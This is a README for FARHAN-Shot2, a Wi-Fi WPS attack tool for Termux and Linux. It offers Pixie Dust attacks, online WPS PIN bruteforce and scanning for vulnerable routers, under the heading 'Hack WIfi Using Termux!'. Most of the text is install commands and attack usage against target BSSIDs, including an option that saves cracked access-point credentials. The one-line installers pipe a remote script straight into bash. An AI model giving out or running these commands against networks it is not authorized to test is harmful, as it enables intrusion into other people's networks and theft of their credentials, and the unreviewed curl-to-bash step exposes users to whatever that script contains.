[![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/)
[![python](https://img.shields.io/badge/python-2.7-brightgreen.svg)](https://www.python.org/downloads/release/python-2714/)
[![OS](https://img.shields.io/badge/Tested%20On-Linux%20%7C%20Android-yellowgreen.svg)](https://termux.com/)

# FARHAN-Shot2_Termux_installer/LINK
```
 https://github.com/Gtajisan/FARHAN-Shot2_Termux_installer
 ```



# Overview
**FARHAN-Shot2** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode.
# Features
 - [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack);
 - integrated [3WiFi offline WPS PIN generator](https://3wifi.stascorp.com/wpspin);
 - [online WPS bruteforce](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf);
 - Wi-Fi scanner with highlighting based on iw;
# Requirements
 - Python 3.6 and above;
 - [Wpa supplicant](https://www.w1.fi/wpa_supplicant/);
 - [Pixiewps](https://github.com/wiire-a/pixiewps);
 - [iw](https://wireless.wiki.kernel.org/en/users/documentation/iw).

Please note that root access is required.  

### Installation one line:

```bash
apt update && apt upgrade && pkg install tsu && pkg install python && pkg install git && pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw openssl && termux-setup-storage && curl -sSf https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2_Termux_installer/master/installer.sh | bash && git clone --depth 1 https://github.com/gtajisan/FARHAN-Shot2 FARHAN-Shot2 && sudo python FARHAN-Shot2/FARHAN-Shot2.py -i wlan0 --iface-down -K
```


## [Termux](https://termux.com/)
Please note that root access is required.  

### Hack WIfi Using Termux! (Requires Root)
<p align="center"><img src="https://j.top4top.io/p_2835ox44m0.png"></



#### Using installer
 ```
 curl -sSf https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2_Termux_installer/master/installer.sh | bash
 ```
#### Manually
**Installing requirements**
 ```
pkg update
pkg upgrade
pkg install tsu
pkg install python
pkg install git
pkg install -y root-repo
pkg install -y git tsu python wpa-supplicant pixiewps iw openssl
termux-setup-storage
 ```
**Getting FARHAN-Shot2**
 ```
 git clone --depth 1 https://github.com/gtajisan/FARHAN-Shot2 FARHAN-Shot2
 ```
#### Running
 ```
 sudo python FARHAN-Shot2/FARHAN-Shot2.py -i wlan0 --iface-down -K
 ```


# Setup
## Debian/Ubuntu
**Installing requirements**
 ```
 sudo apt install -y python3 wpasupplicant iw wget
 ```
**Installing Pixiewps**

***Ubuntu 18.04 and above or Debian 10 and above***
 ```
 sudo apt install -y pixiewps
 ```
 
***Other versions***
 ```
 sudo apt install -y build-essential unzip
 wget https://github.com/wiire-a/pixiewps/archive/master.zip && unzip master.zip
 cd pixiewps*/
 make
 sudo make install
 ```
**Getting FARHAN-Shot2**
 ```
 cd ~
 wget https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2/master/FARHAN-Shot2.py
 ```
Optional: getting a list of vulnerable to pixie dust devices for highlighting in scan results:
 ```
 wget https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2/master/vulnwsc.txt
 ```
## Arch Linux
**Installing requirements**
 ```
 sudo pacman -S wpa_supplicant pixiewps wget python
 ```
**Getting FARHAN-Shot2**
 ```
 wget https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2/master/FARHAN-Shot2.py
 ```
Optional: getting a list of vulnerable to pixie dust devices for highlighting in scan results:
 ```
 wget https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2/master/vulnwsc.txt
 ```
## Alpine Linux
It can also be used to run on Android devices using [Linux Deploy](https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy)

**Installing requirements**  
Adding the testing repository:
 ```
 sudo sh -c 'echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing/" >> /etc/apk/repositories'
 ```
 ```
 sudo apk add python3 wpa_supplicant pixiewps iw
 ```
 **Getting FARHAN-Shot2**
 ```
 sudo wget https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2/master/FARHAN-Shot2.py
 ```
Optional: getting a list of vulnerable to pixie dust devices for highlighting in scan results:
 ```
 sudo wget https://raw.githubusercontent.com/gtajisan/FARHAN-Shot2/master/vulnwsc.txt
 ```
## [Termux](https://termux.com/)


# Usage
```
 FARHAN-Shot2.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 FARHAN-Shot2.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 FARHAN-Shot2.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 FARHAN-Shot2.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 FARHAN-Shot2.py -i wlan0 --pbc
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running FARHAN-Shot2 with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running FARHAN-Shot2 with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
# Acknowledgements
## Special Thanks
* `rofl0r` for initial implementation;
* `Monohrom` for testing, help in catching bugs, some ideas;
* `Wiire` for developing Pixiewps.
